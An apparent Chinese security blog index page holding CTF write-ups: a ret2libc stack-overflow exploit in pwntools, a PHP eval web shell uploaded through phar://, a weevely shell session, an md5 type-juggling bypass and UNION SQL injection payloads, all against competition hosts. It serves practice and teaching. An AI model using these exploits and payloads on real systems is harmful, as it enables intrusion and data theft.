<!DOCTYPE html>
<html lang="English">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">


<script id="hexo-configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '7.4.2',
    exturl: false,
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
    copycode: {"enable":false,"show_result":false,"style":null},
    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
    bookmark: {"enable":false,"color":"#222","save":"auto"},
    fancybox: false,
    mediumzoom: false,
    lazyload: false,
    pangu: false,
    algolia: {
      appID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    },
    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
    path: 'search.xml',
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    translation: {
      copy_button: 'Copy',
      copy_success: 'Copied',
      copy_failure: 'Copy failed'
    },
    sidebarPadding: 40
  };
</script>

  <meta name="description" content="One people that no one know">
<meta property="og:type" content="website">
<meta property="og:title" content="NoOne-hub">
<meta property="og:url" content="https:&#x2F;&#x2F;noone-hub.github.io&#x2F;page&#x2F;3&#x2F;index.html">
<meta property="og:site_name" content="NoOne-hub">
<meta property="og:description" content="One people that no one know">
<meta property="og:locale" content="English">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://noone-hub.github.io/page/3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome: true,
    isPost: false,
    isPage: false,
    isArchive: false
  };
</script>

  <title>NoOne-hub</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-meta">

    <div>
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">NoOne-hub</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
        <p class="site-subtitle">A place that No One knw</p>
  </div>

  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>
</div>


<nav class="site-nav">
  
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>

  </li>
  </ul>

</nav>
</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content">
            

  <div class="posts-expand">
        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="English">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/11/01/v2ray-change/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="One people that no one know">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/01/v2ray-change/" class="post-title-link" itemprop="url">v2ray_linux客户端构思</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-11-01 03:14:36" itemprop="dateCreated datePublished" datetime="2019-11-01T03:14:36+08:00">2019-11-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-10-30 17:37:42" itemprop="dateModified" datetime="2019-10-30T17:37:42+08:00">2019-10-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/linux/" itemprop="url" rel="index">
                    <span itemprop="name">linux</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/linux/v2ray/" itemprop="url" rel="index">
                    <span itemprop="name">v2ray</span>
                  </a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>93</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>1 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="功能构思"><a href="#功能构思" class="headerlink" title="功能构思"></a>功能构思</h1><ol>
<li>修改监听端口</li>
<li>导入vmess</li>
<li>指定配置文件替换</li>
<li>界面输入配置进行更换</li>
<li>多账号切换</li>
<li>订阅更新</li>
<li>修改配置</li>
</ol>
<p>初步想法，做好后利用docker挂载/etc/v2ray目录，通过docker修改配置文件</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="English">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/11/01/writeup-1-%E7%BB%83%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="One people that no one know">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/01/writeup-1-%E7%BB%83%E4%B9%A0/" class="post-title-link" itemprop="url">随便做的练习</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-11-01 03:14:36" itemprop="dateCreated datePublished" datetime="2019-11-01T03:14:36+08:00">2019-11-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-10-30 17:38:21" itemprop="dateModified" datetime="2019-10-30T17:38:21+08:00">2019-10-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" itemprop="url" rel="index">
                    <span itemprop="name">二进制</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/pwn/%E6%A0%88/" itemprop="url" rel="index">
                    <span itemprop="name">栈</span>
                  </a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>2.3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>2 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="writeup-1-练习"><a href="#writeup-1-练习" class="headerlink" title="writeup-1-练习"></a>writeup-1-练习</h1><h2 id="简单的re"><a href="#简单的re" class="headerlink" title="简单的re"></a>简单的re</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+0h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+60h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+68h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  _printf_chk(<span class="number">1L</span>L, <span class="string">"input:"</span>, envp);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v10, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;v10);</span><br><span class="line">  v3 = <span class="number">34</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (<span class="keyword">int</span> *)&amp;v10;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = *v5;</span><br><span class="line">      ++v5;</span><br><span class="line">      v7 = ~v6 &amp; (v6 - <span class="number">16843009</span>) &amp; <span class="number">0x80808080</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !v7 );</span><br><span class="line">    <span class="keyword">if</span> ( !(~v6 &amp; (v6 - <span class="number">16843009</span>) &amp; <span class="number">0x8080</span>) )</span><br><span class="line">      v7 &gt;&gt;= <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !(~v6 &amp; (v6 - <span class="number">16843009</span>) &amp; <span class="number">0x8080</span>) )</span><br><span class="line">      v5 = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)v5 + <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= (<span class="keyword">char</span> *)v5 - __CFADD__((_BYTE)v7, (_BYTE)v7) - <span class="number">3</span> - (<span class="keyword">char</span> *)&amp;v10 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *((_BYTE *)&amp;v10 + i) ^= v3++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;szCmp, &amp;v10, <span class="number">0x16</span>uLL) )</span><br><span class="line">    _printf_chk(<span class="number">1L</span>L, <span class="string">"right\n"</span>, v8);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    _printf_chk(<span class="number">1L</span>L, <span class="string">"wrong\n"</span>, v8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>刚看以为很复杂，后面发觉前面的都是校验，只要异或下就可以了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">List = [<span class="number">0x44</span>, <span class="number">0x4F</span>, <span class="number">0x45</span>, <span class="number">0x42</span>, <span class="number">0x5D</span>, <span class="number">0x1E</span>, <span class="number">0x1B</span>, <span class="number">0x19</span>, <span class="number">0x43</span>, <span class="number">0x7E</span>, <span class="number">0x61</span>, <span class="number">0x1F</span>, <span class="number">0x61</span>, <span class="number">0x59</span>, <span class="number">0x7B</span>, <span class="number">0x76</span>, <span class="number">0x78</span>, <span class="number">0x65</span>, <span class="number">0x0C</span>, <span class="number">0x03</span>, <span class="number">0x41</span>, <span class="number">0x4A</span>]</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(List)):</span><br><span class="line">    flag += chr(List[i]^(<span class="number">0x22</span>+i))</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+60h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input your name:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"hi,%s welcome to shanxi~!\n"</span>, &amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单的栈溢出，64位，开头ropgadget坏了，折腾了一小会，然后exp很简单</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'pwn'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">host = <span class="string">'123.59.204.3'</span></span><br><span class="line">port = <span class="number">3333</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = process(<span class="string">"./pwn"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">    pop_rdi = <span class="number">0x0000000000400863</span></span><br><span class="line">    puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    ret_addr = <span class="number">0x0000000000400776</span></span><br><span class="line">    offset = <span class="number">120</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">120</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(ret_addr)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(<span class="string">"welcome to shanxi~!\n"</span>)</span><br><span class="line">    puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh_addr = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">120</span> + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="English">
    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/11/01/%E5%AE%89%E6%81%92%E8%AE%AD%E7%BB%83%E8%B5%9B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="LiHua">
      <meta itemprop="description" content="One people that no one know">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="NoOne-hub">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/01/%E5%AE%89%E6%81%92%E8%AE%AD%E7%BB%83%E8%B5%9B/" class="post-title-link" itemprop="url">web安全训练</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-11-01 03:14:36" itemprop="dateCreated datePublished" datetime="2019-11-01T03:14:36+08:00">2019-11-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-10-30 17:39:40" itemprop="dateModified" datetime="2019-10-30T17:39:40+08:00">2019-10-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
                    <span itemprop="name">web安全</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E5%AE%89%E5%85%A8/%E7%BB%83%E4%B9%A0/" itemprop="url" rel="index">
                    <span itemprop="name">练习</span>
                  </a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>5.8k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>5 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="安恒训练赛"><a href="#安恒训练赛" class="headerlink" title="安恒训练赛"></a>安恒训练赛</h1><h2 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h2><p><a href="http://114.55.36.69:8009/index.php?url=upload" target="_blank" rel="noopener">http://114.55.36.69:8009/index.php?url=upload</a></p>
<p>upload很明显的文件上传，查了下是php伪协议<br>看到zip于是猜测是phar://伪协议读取。</p>
<p>于是写个小马打包成zip文件传上去。</p>
<p>例如我写的是south.php。</p>
<?php
    @eval($_POST['south']);
    ?>
<p>然后压缩成south.zip，那么需要访问以下链接。</p>
<p>upload/5a722d46033ecd25d5ce0f13a0e7d8ec.zip/south<br><a href="http://114.55.36.69:8009/index.php?url=phar://upload/13d98388fbf7a0397de87ee365830df8.zip/test" target="_blank" rel="noopener">http://114.55.36.69:8009/index.php?url=phar://upload/13d98388fbf7a0397de87ee365830df8.zip/test</a><br>随后连接小马，读到flag{a5aa012546a729eebaeaa768883beb23}。</p>
<p>weevely generate <password> <path></p>
<p>weevely generate test  ./test.php<br>生成小马</p>
<p>然后压缩<br>zip test.zip test.php</p>
<p>然后上传得到了个路径<br>/var/www/html/upload/db29bc3f2a4be40c202cd7de760f41d6.zip<br>/upload/30a95552d102e69505b406933e4332f5.zip</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌─[root@parrot]─[/home/NoOne]</span><br><span class="line">└──╼ <span class="comment">#weevely http://114.55.36.69:8009/index.php?url=phar://upload/a382c5d906587c695f4408c0c7491560.zip/test test</span></span><br><span class="line">/usr/share/weevely/core/sessions.py:219: YAMLLoadWarning: calling yaml.load() without Loader=... is deprecated, as the default Loader is unsafe. Please <span class="built_in">read</span> https://msg.pyyaml.org/load <span class="keyword">for</span> full details.</span><br><span class="line">  sessiondb = yaml.load(open(dbpath, <span class="string">'r'</span>).<span class="built_in">read</span>())</span><br><span class="line"></span><br><span class="line">[+] weevely 3.7.0</span><br><span class="line"></span><br><span class="line">[+] Target:	c23cc37b6623:/var/www/html</span><br><span class="line">[+] Session:	/root/.weevely/sessions/114.55.36.69/index_4.session</span><br><span class="line">[+] Shell:	System shell</span><br><span class="line"></span><br><span class="line">[+] Browse the filesystem or execute commands starts the connection</span><br><span class="line">[+] to the target. Type :<span class="built_in">help</span> <span class="keyword">for</span> more information.</span><br><span class="line"></span><br><span class="line">weevely&gt; ls</span><br><span class="line">flag.php</span><br><span class="line">girl.jpg</span><br><span class="line">index.php</span><br><span class="line">upload</span><br><span class="line">upload.php</span><br><span class="line">c23cc37b6623:/var/www/html $ cat flag.php</span><br><span class="line">&lt;?php</span><br><span class="line">//flag&#123;a5aa012546a729eebaeaa768883beb23&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><a href="http://114.55.36.69:8009/index.php?url=php://filter/convert.base64-encode/resource=flag" target="_blank" rel="noopener">http://114.55.36.69:8009/index.php?url=php://filter/convert.base64-encode/resource=flag</a></p>
<h2 id="简单的md5"><a href="#简单的md5" class="headerlink" title="简单的md5"></a>简单的md5</h2><p>简单的md5 <a href="http://114.55.36.69:8004" target="_blank" rel="noopener">http://114.55.36.69:8004</a></p>
<p>easy MD5 cracking</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--$_POST[<span class="string">'data1'</span>]!=$_POST[<span class="string">'data2'</span>]--&gt;fail</span><br></pre></td></tr></table></figure>

<p>没有md5?应该是只有部分代码</p>
<p>脑补一下剩下的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(($_POST[<span class="string">'data1'</span>]!=$_POST[<span class="string">'data2'</span>])</span><br><span class="line">&amp;&amp;(md5($_POST[<span class="string">'data1'</span>])==md5($_POST[<span class="string">'data2'</span>]))</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br></pre></td></tr></table></figure>
<p>这里用php弱类型绕过就好了<br>传错类型会变成null，所以可以绕过</p>
<p><a href="https://zhuanlan.zhihu.com/p/30323499" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/30323499</a></p>
<p>data1[]=1 &amp;&amp; data2[]=2</p>
<p>flag{401cf19d304e557349fecda18110c138}</p>
<h2 id="简单的新闻搜索"><a href="#简单的新闻搜索" class="headerlink" title="简单的新闻搜索"></a>简单的新闻搜索</h2><p>简单的新闻搜索网站 <a href="http://114.55.36.69:8010" target="_blank" rel="noopener">http://114.55.36.69:8010</a></p>
<p>小知识点：union需要前面的列数跟后面的列数相同，所以少了用数字补</p>
<p>burp</p>
<p>注入表名</p>
<p>word=1%’ union select 1,2,table_name from information_schema.tables where table_schema=database()–  &amp;number=5</p>
<p>注入得到列名</p>
<p>word=1%’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’admin’–  &amp;number=5</p>
<p>得到flag<br>word=1%’ union select 1,2,flag from admin–  &amp;number=5</p>
